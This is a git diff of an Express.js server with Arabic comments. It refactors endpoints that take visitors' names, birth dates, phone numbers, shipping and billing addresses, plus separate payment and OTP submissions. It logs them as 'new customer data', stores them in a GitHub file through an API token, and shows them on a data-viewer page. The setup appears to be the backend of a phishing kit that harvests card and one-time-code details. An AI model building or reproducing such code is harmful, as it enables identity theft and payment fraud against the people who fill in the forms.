@@ -19,7 +19,12 @@ async function saveToGitHub(newData) {
     let existingContent = '';
     let sha = '';
     try {
-        const getRes = await fetch(url, { headers: { Authorization: `token ${GITHUB_TOKEN}` } });
+        const getRes = await fetch(url, { 
+            headers: { 
+                Authorization: `token ${GITHUB_TOKEN}`,
+                'Accept': 'application/json'
+            } 
+        });
         if (getRes.ok) {
             const fileInfo = await getRes.json();
             sha = fileInfo.sha;
@@ -46,11 +51,6 @@ async function saveToGitHub(newData) {
     });
 }
 
-// ========== المتغير المؤقت للبيانات ==========
-let cachedData = '';
-let lastFetchTime = 0;
-const CACHE_DURATION = 5000; // 5 ثواني
-
 // ========== دالة جلب البيانات من GitHub ==========
 async function fetchFromGitHub() {
     try {
@@ -74,6 +74,10 @@ async function fetchFromGitHub() {
     }
 }
 
+// ========== المتغير المؤقت ==========
+let cachedData = '';
+let lastFetchTime = 0;
+
 // ========== المسارات ==========
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page1.html')));
 app.get('/page2', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page2.html')));
@@ -86,17 +90,16 @@ app.get('/data-viewer', (req, res) => {
     res.sendFile(path.join(__dirname, 'views', 'data-viewer.html'));
 });
 
-// ========== API لجلب البيانات (من الكاش) ==========
+// ========== API لجلب البيانات ==========
 app.get('/api/data', async (req, res) => {
     try {
+        // نجيب بيانات جديدة كل 5 ثواني
         const now = Date.now();
-        
-        // لو الكاش قديم، نجيب بيانات جديدة
-        if (now - lastFetchTime > CACHE_DURATION) {
-            console.log('🔄 تحديث الكاش...');
+        if (now - lastFetchTime > 5000 || !cachedData) {
+            console.log('🔄 جلب بيانات جديدة من GitHub...');
             cachedData = await fetchFromGitHub();
             lastFetchTime = now;
-            console.log('✅ تم تحديث الكاش، الطول:', cachedData.length);
+            console.log('✅ تم جلب البيانات، الطول:', cachedData.length);
         }
         
         res.setHeader('Content-Type', 'text/plain; charset=utf-8');
@@ -107,34 +110,11 @@ app.get('/api/data', async (req, res) => {
     }
 });
 
-// ========== استقبال بيانات العنوان ==========
+// ========== استقبال البيانات ==========
 app.post('/submit-data', async (req, res) => {
     try {
         const data = req.body;
         
-        const cleanData = {
-            '📦 بيانات الشحن': {
-                'الاسم الكامل': data.username || 'غير محدد',
-                'تاريخ الميلاد': `${data.dob_month || ''}/${data.dob_day || ''}/${data.dob_year || ''}`,
-                'رقم الهاتف': data.phone || 'غير محدد',
-                'الدولة': data.country || 'غير محدد',
-                'العنوان': data.address_line1 || 'غير محدد',
-                'العنوان (سطر 2)': data.address_line2 || 'غير محدد',
-                'المدينة': data.city || 'غير محدد',
-                'الولاية': data.state || 'غير محدد',
-                'الرمز البريدي': data.zipcode || 'غير محدد'
-            },
-            '💳 بيانات الفوترة': {
-                'الاسم الكامل': data.billing_username || data.billing_username_hidden || 'نفس الشحن',
-                'العنوان': data.billing_address_line1 || data.billing_address_line1_hidden || 'نفس الشحن',
-                'العنوان (سطر 2)': data.billing_address_line2 || data.billing_address_line2_hidden || 'نفس الشحن',
-                'المدينة': data.billing_city || data.billing_city_hidden || 'نفس الشحن',
-                'الولاية': data.billing_state || data.billing_state_hidden || 'نفس الشحن',
-                'الرمز البريدي': data.billing_zipcode || data.billing_zipcode_hidden || 'نفس الشحن',
-                'رقم الهاتف': data.billing_phone || data.billing_phone_hidden || 'نفس الشحن'
-            }
-        };
-
         let logData = '\n' + '='.repeat(50) + '\n';
         logData += `📋 بيانات العميل الجديدة\n`;
         logData += `🕐 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
@@ -142,15 +122,25 @@ app.post('/submit-data', async (req, res) => {
 
         logData += '📦 بيانات الشحن:\n';
         logData += '-'.repeat(40) + '\n';
-        Object.entries(cleanData['📦 بيانات الشحن']).forEach(([key, value]) => {
-            logData += `${key}: ${value}\n`;
-        });
+        logData += `الاسم الكامل: ${data.username || 'غير محدد'}\n`;
+        logData += `تاريخ الميلاد: ${data.dob_month || ''}/${data.dob_day || ''}/${data.dob_year || ''}\n`;
+        logData += `رقم الهاتف: ${data.phone || 'غير محدد'}\n`;
+        logData += `الدولة: ${data.country || 'غير محدد'}\n`;
+        logData += `العنوان: ${data.address_line1 || 'غير محدد'}\n`;
+        logData += `العنوان (سطر 2): ${data.address_line2 || 'غير محدد'}\n`;
+        logData += `المدينة: ${data.city || 'غير محدد'}\n`;
+        logData += `الولاية: ${data.state || 'غير محدد'}\n`;
+        logData += `الرمز البريدي: ${data.zipcode || 'غير محدد'}\n`;
 
         logData += '\n💳 بيانات الفوترة:\n';
         logData += '-'.repeat(40) + '\n';
-        Object.entries(cleanData['💳 بيانات الفوترة']).forEach(([key, value]) => {
-            logData += `${key}: ${value}\n`;
-        });
+        logData += `الاسم الكامل: ${data.billing_username || data.billing_username_hidden || 'نفس الشحن'}\n`;
+        logData += `العنوان: ${data.billing_address_line1 || data.billing_address_line1_hidden || 'نفس الشحن'}\n`;
+        logData += `العنوان (سطر 2): ${data.billing_address_line2 || data.billing_address_line2_hidden || 'نفس الشحن'}\n`;
+        logData += `المدينة: ${data.billing_city || data.billing_city_hidden || 'نفس الشحن'}\n`;
+        logData += `الولاية: ${data.billing_state || data.billing_state_hidden || 'نفس الشحن'}\n`;
+        logData += `الرمز البريدي: ${data.billing_zipcode || data.billing_zipcode_hidden || 'نفس الشحن'}\n`;
+        logData += `رقم الهاتف: ${data.billing_phone || data.billing_phone_hidden || 'نفس الشحن'}\n`;
 
         logData += '\n' + '='.repeat(50) + '\n';
 
@@ -168,7 +158,6 @@ app.post('/submit-data', async (req, res) => {
     }
 });
 
-// ========== استقبال بيانات الدفع ==========
 app.post('/submit-payment', async (req, res) => {
     try {
         const data = req.body;
@@ -196,7 +185,6 @@ app.post('/submit-payment', async (req, res) => {
     }
 });
 
-// ========== استقبال OTP ==========
 app.post('/submit-otp', async (req, res) => {
     try {
         const data = req.body;
